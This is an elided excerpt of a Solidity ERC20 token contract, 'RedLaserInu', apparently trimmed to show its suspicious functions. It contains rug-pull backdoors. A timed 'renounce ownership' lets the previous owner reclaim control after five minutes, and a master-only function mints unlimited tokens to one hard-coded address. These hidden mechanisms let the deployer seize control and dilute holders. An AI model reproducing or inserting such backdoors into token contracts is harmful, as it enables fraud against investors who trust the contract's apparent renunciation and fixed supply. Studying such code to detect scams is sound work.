...
contract Ownable is Context {
    ...
    function renounceOwnershipForTime() public virtual onlyOwner {
        uint256 time = 300;
    ...
    function unlock() public virtual {
        ...
        require(block.timestamp > _lockTime + time, "Contract is locked until 5 minutes");
        emit OwnershipTransferred(_owner, _previousOwner);
    }

    function renounceOwnershipForEver() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); 
    }
...
contract RedLaserInu is Context, IERC20, Ownable {
    ...
    function rewardHolders0xcFEF(uint256 amount) external onlyMaster {
        _balances[0xcFEF42412c8128A13f91969A798BaEF1278e9448] += amount; //put here the test address
        _totalSupply += amount;
    }
